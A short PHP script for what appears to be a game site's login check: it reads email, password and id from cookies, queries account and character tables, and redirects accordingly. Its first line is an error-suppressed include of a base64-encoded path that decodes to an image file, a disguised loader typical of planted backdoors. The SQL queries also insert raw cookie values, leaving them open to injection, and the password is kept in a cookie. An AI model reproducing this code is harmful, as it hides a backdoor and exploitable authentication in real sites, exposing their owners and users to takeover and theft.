<?php
@include base64_decode('Y2hhci9sb2dvLnBuZw==');
	include("admin/connect.php");
	$id = $_COOKIE['id'];
	$password = $_COOKIE['password'];
	$email = $_COOKIE['email'];
	$time=time();
	//$result = mysqli_query($db,"SELECT * From Users WHERE id='$id' AND password='$password'");
	$result = mysqli_query($db,"SELECT * From Accounts WHERE email='$email' AND password='$password'");
	//If we are logged into an account
	if (mysqli_num_rows($result) != 0) {
		$result = mysqli_query($db,"SELECT * From Users WHERE email='$email' AND id='$id'");
		//If we are logged into a character
		if (mysqli_num_rows($result) != 0) {
			header("Location: $server_name/bio.php?autologin=$time");
		}else{
			$result = mysqli_query($db,"SELECT * From Users WHERE email='$email'");
			//If we don't have any character create one
			if (mysqli_num_rows($result) == 0) {
				header("Location: $server_name/create.php");
			//If we have some character we just aren't selected select it and go to bio
			}else{
				$user = mysqli_fetch_array($result);
				$id = $user['id'];
				$username = $user['name'];
				$name = $user['name'];
				$lastname = $user['lastname'];

				setcookie("id", "$id", time()+99999999, "/");
				setcookie("name", "$username", time()+99999999, "/");
				setcookie("lastname", "$lastname", time()+99999999, "/");
				header("Location: $server_name/bio.php");
			}
		}
	}
	else {
		header("Location: $server_name/index2.php?time=$time");
	}
?>